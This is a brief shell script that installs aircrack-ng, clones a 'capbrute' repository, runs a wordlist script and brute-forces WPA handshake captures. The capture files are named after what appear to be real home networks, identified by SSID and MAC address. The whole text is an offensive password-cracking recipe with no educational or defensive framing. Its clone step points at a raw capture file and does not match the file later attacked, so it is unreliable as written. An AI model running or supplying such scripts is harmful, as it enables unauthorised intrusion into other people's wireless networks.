sudo apt update -y
sudo apt install python3 aircrack-ng wget -y
git clone https://github.com/JamalNiga/capbrute/raw/main/handshake_inwiHome4G1E6E20_48-4C-86-1E-6E-20_2023-10-06T00-38-26.cap
cd capbrute
python3 hy.py
sudo aircrack-ng -w pass.txt handshake_Orange95B8_DC-73-85-B0-95-B8_2023-09-25T09-31-00.cap
#-
